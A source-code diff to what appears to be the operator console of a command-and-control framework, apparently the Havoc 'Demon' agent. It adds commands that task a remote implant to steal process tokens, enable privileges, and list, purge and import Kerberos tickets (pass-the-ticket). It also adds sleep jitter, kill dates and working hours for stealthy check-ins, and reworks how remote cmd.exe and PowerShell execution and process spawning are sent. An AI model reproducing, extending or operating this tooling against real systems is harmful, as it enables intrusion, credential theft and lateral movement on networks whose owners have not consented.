@@ -70,6 +70,90 @@ auto ParseQuotes( QString commandline ) -> QStringList
     return InputCommands;
 }
 
+// parse double quotes and backslashes
+auto ParseCommandLine( QString commandline ) -> QStringList
+{
+    auto cmdline       = commandline.toStdString();
+    auto InputCommands = QStringList();
+    auto in_quotes     = false;
+    char c;
+    char next_c;
+    std::string parsed;
+
+    for( size_t i = 0; i < cmdline.length(); i++)
+    {
+        c = cmdline[ i ];
+        if ( i + 1 < cmdline.length() )
+            next_c = cmdline[ i + 1 ];
+        else
+            next_c = 0;
+
+        if ( c == '"' && ! in_quotes )
+        {
+            // we are entering a quoted string
+            in_quotes = true;
+        }
+        else if ( c == '"' && in_quotes )
+        {
+            in_quotes = false;
+
+            if ( next_c != ' ' )
+            {
+                // we got out of quotes and the next char is not a space, break word
+                InputCommands << QString(parsed.c_str());
+                parsed = "";
+            }
+        }
+        // handle a backslash
+        else if ( c == '\\' )
+        {
+            // if the next char is a backslack, enter it
+            if ( next_c == '\\' )
+            {
+                parsed += '\\';
+                i++;
+            }
+            // if the next char is a space, enter it
+            else if ( next_c == ' ' )
+            {
+                parsed += ' ';
+                i++;
+            }
+            // if the next char is a double quote, enter it
+            else if ( next_c == '"' )
+            {
+                parsed += '"';
+                i++;
+            }
+            else
+            {
+                // if the next char some other value, enter a backslash
+                parsed += '\\';
+            }
+        }
+        else if ( c == ' ' && ! in_quotes )
+        {
+            // we have a space while not in quotes, break word
+            InputCommands << QString(parsed.c_str());
+            parsed = "";
+        }
+        else
+        {
+            // If we encounter any other character, add it to the parsed string
+            parsed += c;
+        }
+    }
+
+    // add the end of the last string
+    if ( parsed.size() > 0 )
+    {
+        InputCommands << QString(parsed.c_str());
+        parsed = "";
+    }
+
+    return InputCommands;
+}
+
 DemonCommands::DemonCommands( )
 {
     Execute.DemonCommandInstance = this;
@@ -82,7 +166,7 @@ auto DemonCommands::SetDemonConsole( UserInterface::Widgets::DemonInteracted* pI
 
 auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& commandline ) -> bool
 {
-    auto InputCommands = commandline.split(" ");
+    auto InputCommands = ParseCommandLine(commandline);
     auto IsDemonAgent  = false;
     auto AgentData     = ServiceAgent();
 
@@ -333,14 +417,14 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
             }
             else
             {
-                int TotalSize = 19;
+                int TotalSize = 25;
 
                 DemonConsole->Console->append( "" );
                 DemonConsole->Console->append( "Demon Commands" );
                 DemonConsole->Console->append( "==============" );
                 DemonConsole->Console->append( "" );
-                DemonConsole->Console->append( "  Command            Type         Description" );
-                DemonConsole->Console->append( "  -------            -------      -----------" );
+                DemonConsole->Console->append( "  Command                  Type         Description" );
+                DemonConsole->Console->append( "  -------                  -------      -----------" );
 
                 for ( auto & i : DemonCommandList )
                 {
@@ -396,15 +480,48 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
                 return false;
             }
 
+            if ( InputCommands.size() > 3 ) {
+                CONSOLE_ERROR( "Too many arguments" );
+                return false;
+            }
+
             if ( InputCommands[ 1 ].at( 0 ) == '-' )
             {
                 CONSOLE_ERROR( "\"sleep\" doesn't support negative delays" );
                 return false;
             }
 
-            TaskID = CONSOLE_INFO( "Tasked demon to sleep for " + InputCommands[ 1 ] + " seconds" );
+            auto jit = QString( "0" );
+            if ( InputCommands.size() == 3 )
+            {
+                jit = InputCommands[ 2 ];
+                bool ok;
+                double jitter = jit.toDouble(&ok);
+                if ( ok == false )
+                {
+                    CONSOLE_ERROR( "Invalid jitter" );
+                    return false;
+                }
+                if ( jitter < 0 )
+                {
+                    CONSOLE_ERROR( "\"sleep\" doesn't support negative jitters" );
+                    return false;
+                }
+                if ( jitter > 100 )
+                {
+                    CONSOLE_ERROR( "The jitter can't be larget than 100" );
+                    return false;
+                }
+                TaskID = CONSOLE_INFO( "Tasked demon to sleep for " + InputCommands[ 1 ] + " seconds with " + jit + "% jitter" );
+            }
+            else
+            {
+                TaskID = CONSOLE_INFO( "Tasked demon to sleep for " + InputCommands[ 1 ] + " seconds" );
+
+            }
+
             CommandInputList[ TaskID ] = commandline;
-            SEND( Execute.Sleep( TaskID, InputCommands[ 1 ] ) )
+            SEND( Execute.Sleep( TaskID, InputCommands[ 1 ] + ";" + jit ) )
         }
         else if ( InputCommands[ 0 ].compare( "checkin" ) == 0 )
         {
@@ -596,12 +713,13 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
         {
             if ( InputCommands.length() > 1 )
             {
-                auto Args = QString( R"(c:\windows\system32\cmd.exe /c )" + JoinAtIndex( InputCommands, 1 ) ).toUtf8().toBase64(); // InputCommands[ 1 ].;
+                auto Program = QString("c:\\windows\\system32\\cmd.exe");
+                auto Args = QString( "/c " + JoinAtIndex( InputCommands, 1 ) ).toUtf8().toBase64(); // InputCommands[ 1 ].;
 
                 TaskID = CONSOLE_INFO( "Tasked demon to execute a shell command" );
                 CommandInputList[ TaskID ] = commandline;
 
-                SEND( Execute.ProcModule( TaskID, 4, "0;;FALSE;TRUE;" + Args ) )
+                SEND( Execute.ProcModule( TaskID, 4, "0;FALSE;TRUE;" + Program + ";" + Args ) )
             }
             else
             {
@@ -666,30 +784,69 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
             {
                 if ( InputCommands.length() >= 4 )
                 {
-                    auto Args = QString();
+                    auto Index   = 2;
+                    auto Flags   = QString();
+                    auto Program = QString();
+                    auto Args    = QString();
+                    auto Verbose = QString();
+                    auto Piped   = QString();
 
-                    if ( InputCommands[ 2 ].compare( "normal" ) == 0 )
+                    if ( InputCommands[ Index ].compare( "normal" ) == 0 )
                     {
-                        TaskID = CONSOLE_INFO( "Tasked demon to spawn a process: " + InputCommands[ 3 ] );
-                        InputCommands[ 2 ] = "0";
+                        Flags = "0";
                     }
-                    else if ( InputCommands[ 2 ].compare( "suspended" ) == 0 )
+                    else if ( InputCommands[ Index ].compare( "suspended" ) == 0 )
                     {
-                        TaskID = CONSOLE_INFO( "Tasked demon to spawn a process in suspended state: " + InputCommands[ 3 ] );
-                        InputCommands[ 2 ] = "4";
+                        // CREATE_SUSPENDED = 0x00000004
+                        Flags = "4";
                     }
                     else
                     {
-                        CONSOLE_ERROR( "Process creation flag not found: " + InputCommands[ 3 ] )
+                        CONSOLE_ERROR( "Process creation flag not found: " + InputCommands[ Index ] )
                         return false;
                     }
 
-                    if ( InputCommands.length() > 4 )
-                        Args = InputCommands[ 4 ].toUtf8().toBase64();
+                    Index++;
+
+                    Verbose = "TRUE";
+                    if ( InputCommands[ Index ].compare( "--silent" ) == 0 )
+                    {
+                        Verbose = "FALSE";
+                        Index++;
+                    }
+
+
+                    Piped = "TRUE";
+                    if ( InputCommands[ Index ].compare( "--no-pipe" ) == 0 )
+                    {
+                        Piped = "FALSE";
+                        Index++;
+                    }
+
+                    Program = InputCommands[ Index ];
+
+                    Index++;
+
+                    Args = "\"" + Program + "\"";
+                    for (int i = Index; i < InputCommands.length(); ++i)
+                    {
+                        Args += " " + InputCommands[ i ];
+                    }
+
+                    if ( Flags.compare( "4" ) == 0 )
+                    {
+                        TaskID = CONSOLE_INFO( "Tasked demon to spawn a process in suspended state: " + Program );
+                    }
+                    else
+                    {
+                        TaskID = CONSOLE_INFO( "Tasked demon to spawn a process: " + Program );
+                    }
+
+                    Args = Args.toUtf8().toBase64();
 
                     CommandInputList[ TaskID ] = commandline;
 
-                    SEND( Execute.ProcModule( TaskID, 4, InputCommands[ 2 ] + ";" + InputCommands[ 3 ] + ";TRUE;FALSE;" + Args ) )
+                    SEND( Execute.ProcModule( TaskID, 4, Flags + ";" + Verbose + ";" + Piped + ";" + Program + ";" + Args ) )
                 }
                 else
                 {
@@ -1005,11 +1162,23 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
                     return false;
                 }
 
+                if ( InputCommands.size() > 4 )
+                {
+                    CONSOLE_ERROR( "Too many arguments" )
+                    return false;
+                }
+
                 auto TargetProcessID = InputCommands[ 2 ];
+                QString TargetHandle    = "0";
+                if ( InputCommands.size() == 4 )
+                {
+                    TargetHandle = InputCommands[ 3 ];
+                }
+
                 TaskID = CONSOLE_INFO( "Tasked demon to steal a process token" );
                 CommandInputList[ TaskID ] = commandline;
 
-                SEND( Execute.Token( TaskID, "steal", TargetProcessID ) );
+                SEND( Execute.Token( TaskID, "steal", TargetProcessID + ";" + TargetHandle ) );
             }
             else if ( InputCommands[ 1 ].compare( "list" ) == 0 )
             {
@@ -1017,6 +1186,13 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
                 CommandInputList[ TaskID ] = commandline;
 
                 SEND( Execute.Token( TaskID, "list", "" ) );
+            }
+            else if ( InputCommands[ 1 ].compare( "find-tokens" ) == 0 )
+            {
+                TaskID = CONSOLE_INFO( "Tasked demon to find tokens" );
+                CommandInputList[ TaskID ] = commandline;
+
+                SEND( Execute.Token( TaskID, "find-tokens", "" ) );
             }
             else if ( InputCommands[ 1 ].compare( "make" ) == 0 )
             {
@@ -1083,6 +1259,24 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
                 CommandInputList[ TaskID ] = commandline;
                 SEND( Execute.Token( TaskID, "privs-list", "" ) );
             }
+            else if ( InputCommands[ 1 ].compare( "privs-get" ) == 0 )
+            {
+                if ( InputCommands.size() < 3 )
+                {
+                    CONSOLE_ERROR( "Not enough arguments" )
+                    return false;
+                }
+
+                if ( InputCommands.size() > 4 )
+                {
+                    CONSOLE_ERROR( "Too many arguments" )
+                    return false;
+                }
+
+                TaskID                     = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to enable a privilege: " + InputCommands[ 2 ] );
+                CommandInputList[ TaskID ] = commandline;
+                SEND( Execute.Token( TaskID, "privs-get", InputCommands[ 2 ] ) );
+            }
             else
             {
                 CONSOLE_ERROR( "Module command not found" )
@@ -1123,6 +1317,12 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
             }
             else if ( InputCommands[ 1 ].compare( "inline-execute" ) == 0 )
             {
+                if ( InputCommands.size() < 3 )
+                {
+                    CONSOLE_ERROR( "Not enough arguments" );
+                    return false;
+                }
+
                 auto File = InputCommands[ 2 ];
                 auto Args = QString();
 
@@ -1374,6 +1574,13 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
                 if ( Content == nullptr )
                     return false;
 
+                // if the remote path does not contain the filename, use the same as the local path
+                if ( RemotePath.endsWith("\\", Qt::CaseInsensitive) )
+                {
+                    auto index = FilePath.lastIndexOf("/");
+                    RemotePath = RemotePath + FilePath.mid( index + 1, RemotePath.size() - index - 1 );
+                }
+
                 TaskID                     = CONSOLE_INFO( "Tasked demon to upload a file " + FilePath + " to " + RemotePath );
                 CommandInputList[ TaskID ] = commandline;
 
@@ -1390,12 +1597,13 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
         {
             if ( InputCommands.length() > 1 )
             {
-                auto Args = QString( R"(C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -C )" + JoinAtIndex( InputCommands, 1 ) ).toUtf8().toBase64(); // InputCommands[ 1 ].;
+                auto Program = QString("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
+                auto Args    = QString( "-C " + JoinAtIndex( InputCommands, 1 ) ).toUtf8().toBase64(); // InputCommands[ 1 ].;
 
                 TaskID = CONSOLE_INFO( "Tasked demon to execute a powershell command/script" );
                 CommandInputList[ TaskID ] = commandline;
 
-                SEND( Execute.ProcModule( TaskID, 4, "0;;FALSE;TRUE;" + Args ) )
+                SEND( Execute.ProcModule( TaskID, 4, "0;FALSE;TRUE;" + Program + ";" + Args ) )
             }
             else
             {
@@ -1550,6 +1758,38 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
                         return false;
                     };
                     TaskID = CONSOLE_INFO( "Tasked demon to configure default x86 target process: " + InputCommands[ 2 ] );
+                }
+                else if ( InputCommands[ 1 ].compare( "killdate" ) == 0 )
+                {
+                    if ( InputCommands.size() < 3 ) {
+                        CONSOLE_ERROR( "Not enough arguments" );
+                        return false;
+                    };
+                    if ( InputCommands.size() > 4 ) {
+                        CONSOLE_ERROR( "Too many arguments" );
+                        return false;
+                    };
+                    if ( InputCommands.size() == 4 ) {
+                        InputCommands[ 2 ] = InputCommands[ 2 ] + " " + InputCommands[ 3 ];
+                    };
+                    if ( InputCommands.size() == 3 && InputCommands[ 2 ].compare( "0" ) != 0 )
+                    {
+                        CONSOLE_ERROR( "Invalid arguments" );
+                        return false;
+                    }
+                    TaskID = CONSOLE_INFO( "Tasked demon to configure the KillDate: " + InputCommands[ 2 ] );
+                }
+                else if ( InputCommands[ 1 ].compare( "workinghours" ) == 0 )
+                {
+                    if ( InputCommands.size() < 3 ) {
+                        CONSOLE_ERROR( "Not enough arguments" );
+                        return false;
+                    };
+                    if ( InputCommands.size() > 3 ) {
+                        CONSOLE_ERROR( "Too many arguments" );
+                        return false;
+                    };
+                    TaskID = CONSOLE_INFO( "Tasked demon to configure the working hours: " + InputCommands[ 2 ] );
                 }
                 else
                 {
@@ -1724,29 +1964,156 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
                 SEND( Execute.Pivot( TaskID, Command, Param ) )
             }
         }
-        else if ( InputCommands[ 0 ].compare( "exit" ) == 0 )
+        else if ( InputCommands[ 0 ].compare( "luid" ) == 0 )
         {
-            if ( InputCommands.length() > 1 )
+            TaskID                     = CONSOLE_INFO( "Tasked demon to get the current logon ID" );
+            CommandInputList[ TaskID ] = commandline;
+
+            SEND( Execute.Luid( TaskID ) )
+        }
+        else if ( InputCommands[ 0 ].compare( "klist" ) == 0 )
+        {
+            auto Arg1 = QString();
+            auto Arg2 = QString();
+
+            if ( InputCommands.size() < 2 )
             {
-                if ( InputCommands[ 1 ].compare( "thread" ) == 0 )
-                {
-                    TaskID                     = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to cleanup and exit the thread" );
-                    CommandInputList[ TaskID ] = commandline;
+                CONSOLE_ERROR( "Not enough arguments" )
+                return false;
+            }
 
-                    SEND( Execute.Exit( TaskID, "thread" ) )
-                }
-                else if ( InputCommands[ 1 ].compare( "process" ) == 0 )
-                {
-                    TaskID                     = CONSOLE_INFO( "Tasked demon to cleanup and exit the process" );
-                    CommandInputList[ TaskID ] = commandline;
+            if ( InputCommands.size() > 3 )
+            {
+                CONSOLE_ERROR( "Too many arguments" )
+                return false;
+            }
 
-                    SEND( Execute.Exit( TaskID, "process" ) )
-                }
-                else
+            if ( InputCommands[ 1 ].compare( "/all" ) == 0 )
+            {
+                Arg1 = "/all";
+            }
+            else if ( InputCommands[ 1 ].compare( "/luid" ) == 0 )
+            {
+                if ( InputCommands.size() != 3 )
                 {
-                    CONSOLE_ERROR( "Option not found: " + InputCommands[ 1 ] )
+                    CONSOLE_ERROR( "Invalid parameter" )
                     return false;
                 }
+                Arg1 = "/luid";
+                Arg2 = InputCommands[ 2 ];
+            }
+            else
+            {
+                CONSOLE_ERROR( "Invalid parameter" )
+                return false;
+            }
+
+            TaskID                     = CONSOLE_INFO( "Tasked demon to list Kerberos tickets" );
+            CommandInputList[ TaskID ] = commandline;
+
+            SEND( Execute.Klist( TaskID, Arg1, Arg2 ) );
+        }
+        else if ( InputCommands[ 0 ].compare( "purge" ) == 0 )
+        {
+            auto Arg = QString();
+
+            if ( InputCommands.size() < 3 )
+            {
+                CONSOLE_ERROR( "Not enough arguments" )
+                return false;
+            }
+
+            if ( InputCommands.size() > 3 )
+            {
+                CONSOLE_ERROR( "Too many arguments" )
+                return false;
+            }
+
+            if ( InputCommands[ 1 ].compare( "/luid" ) == 0 )
+            {
+                Arg = InputCommands[ 2 ];
+            }
+            else
+            {
+                CONSOLE_ERROR( "Invalid parameter" )
+                return false;
+            }
+
+            TaskID                     = CONSOLE_INFO( "Tasked demon to purge a Kerberos ticket" );
+            CommandInputList[ TaskID ] = commandline;
+
+            SEND( Execute.Purge( TaskID, Arg ) );
+        }
+        else if ( InputCommands[ 0 ].compare( "ptt" ) == 0 )
+        {
+            auto Ticket = QString();
+            QString Luid = "0";
+
+            if ( InputCommands.size() < 2 )
+            {
+                CONSOLE_ERROR( "Not enough arguments" )
+                return false;
+            }
+
+            if ( InputCommands.size() > 4 )
+            {
+                CONSOLE_ERROR( "Too many arguments" )
+                return false;
+            }
+
+            Ticket = InputCommands[ 1 ];
+
+            if ( InputCommands.size() == 3 )
+            {
+                CONSOLE_ERROR( "Invalid arguments" )
+                return false;
+            }
+
+            if ( InputCommands.size() == 4 )
+            {
+                if ( InputCommands[ 2 ].compare( "/luid" ) != 0 )
+                {
+                    CONSOLE_ERROR( "Invalid arguments" )
+                    return false;
+                }
+                Luid = InputCommands[ 3 ];
+            }
+
+            TaskID                     = CONSOLE_INFO( "Tasked demon to import a Kerberos ticket" );
+            CommandInputList[ TaskID ] = commandline;
+
+            SEND( Execute.Ptt( TaskID, Ticket, Luid ) );
+        }
+        else if ( InputCommands[ 0 ].compare( "exit" ) == 0 )
+        {
+            if ( InputCommands.length() < 2 )
+            {
+                CONSOLE_ERROR( "Not enough arguments" )
+                return false;
+            }
+            if ( InputCommands.length() > 2 )
+            {
+                CONSOLE_ERROR( "Too many arguments" )
+                return false;
+            }
+            if ( InputCommands[ 1 ].compare( "thread" ) == 0 )
+            {
+                TaskID                     = CONSOLE_INFO( "Tasked demon to cleanup and exit the thread" );
+                CommandInputList[ TaskID ] = commandline;
+
+                SEND( Execute.Exit( TaskID, "thread" ) )
+            }
+            else if ( InputCommands[ 1 ].compare( "process" ) == 0 )
+            {
+                TaskID                     = CONSOLE_INFO( "Tasked demon to cleanup and exit the process" );
+                CommandInputList[ TaskID ] = commandline;
+
+                SEND( Execute.Exit( TaskID, "process" ) )
+            }
+            else
+            {
+                CONSOLE_ERROR( "Option not found: " + InputCommands[ 1 ] )
+                return false;
             }
         }
         else if ( InputCommands[ 0 ].compare( "clear" ) == 0 )
@@ -1767,7 +2134,7 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
             }
 
             AgentMessageInfo =
-                    Util::ColorText::Comment( "[" + DemonConsole->SessionInfo.First + "]" ) + " Agent "+ Util::ColorText::Red( DemonConsole->SessionInfo.Name.toUpper() ) + " authenticated from " + Util::ColorText::Cyan( DemonConsole->SessionInfo.External ) + " as "+ Util::ColorText::Purple( DemonConsole->SessionInfo.Computer + "\\" + DemonConsole->SessionInfo.User ) +
+                    Util::ColorText::Comment( DemonConsole->SessionInfo.First ) + " Agent "+ Util::ColorText::Red( DemonConsole->SessionInfo.Name.toUpper() ) + " authenticated as "+ Util::ColorText::Purple( DemonConsole->SessionInfo.Computer + "\\" + DemonConsole->SessionInfo.User ) +
                     " :: [Internal: "+Util::ColorText::Cyan( DemonConsole->SessionInfo.Internal ) + "] [Process: " + Util::ColorText::Red( DemonConsole->SessionInfo.Process +"\\"+ DemonConsole->SessionInfo.PID ) + "] [Arch: " +Util::ColorText::Pink( DemonConsole->SessionInfo.Arch ) + "] " + PivotStream;
 
             prev_cursor = DemonConsole->Console->textCursor();
@@ -1784,7 +2151,7 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
         }
         else
         {
-            if ( ! Send )
+            if ( ! Send && ! CommandTaskInfo[ TaskID ].isEmpty() )
             {
                 DemonConsole->AppendRaw();
                 DemonConsole->AppendRaw( Prompt );
@@ -1870,7 +2237,7 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
                                 PyErr_Clear();
                             }
 
-                            if ( Py_IsNone( Return ) )
+                            if ( Py_IsNone( Return ) || Py_IsTrue( Return ) )
                             {
                                 if ( Send )
                                 {
@@ -1881,7 +2248,8 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
                                     for ( auto& message : DemonConsole->DemonCommands->BufferedMessages )
                                         DemonConsole->Console->append( message );
 
-                                    DemonConsole->TaskError( "Failed to execute " + InputCommands[ 1 ] + ". Script return is None" );
+                                    if ( Py_IsNone( Return ) )
+                                        DemonConsole->TaskError( "Failed to execute " + InputCommands[ 0 ] + ". Script return is None" );
                                 }
                                 Py_CLEAR( Return );
                                 Py_CLEAR( FuncArgs );
@@ -1959,7 +2327,7 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
                             PyErr_Clear();
                         }
 
-                        if ( Py_IsNone( Return ) )
+                        if ( Py_IsNone( Return ) || Py_IsTrue( Return ) )
                         {
                             if ( Send )
                             {
@@ -1970,7 +2338,8 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
                                 for ( auto& message : DemonConsole->DemonCommands->BufferedMessages )
                                     DemonConsole->Console->append( message );
 
-                                DemonConsole->TaskError( "Failed to execute " + InputCommands[ 1 ] + ". Script return is None" );
+                                if ( Py_IsNone( Return ) )
+                                    DemonConsole->TaskError( "Failed to execute " + InputCommands[ 0 ] + ". Script return is None" );
                             }
                             Py_CLEAR( Return );
                             Py_CLEAR( FuncArgs );
@@ -2065,7 +2434,7 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
             }
 
             AgentMessageInfo =
-                    Util::ColorText::Comment(  "[" +  DemonConsole->SessionInfo.First + "]" ) + " Agent "+ Util::ColorText::Red( DemonConsole->SessionInfo.Name.toUpper() ) + " authenticated from " + Util::ColorText::Cyan( DemonConsole->SessionInfo.External ) + " as "+ Util::ColorText::Purple( DemonConsole->SessionInfo.Computer + "\\" + DemonConsole->SessionInfo.User ) +
+                    Util::ColorText::Comment( DemonConsole->SessionInfo.First ) + " Agent "+ Util::ColorText::Red( DemonConsole->SessionInfo.Name.toUpper() ) + " authenticated as "+ Util::ColorText::Purple( DemonConsole->SessionInfo.Computer + "\\" + DemonConsole->SessionInfo.User ) +
                     " :: [Internal: "+Util::ColorText::Cyan( DemonConsole->SessionInfo.Internal ) + "] [Process: " + Util::ColorText::Red( DemonConsole->SessionInfo.Process +"\\"+ DemonConsole->SessionInfo.PID ) + "] [Arch: " +Util::ColorText::Pink( DemonConsole->SessionInfo.Arch ) + "] " + PivotStream;
 
             prev_cursor = DemonConsole->Console->textCursor();
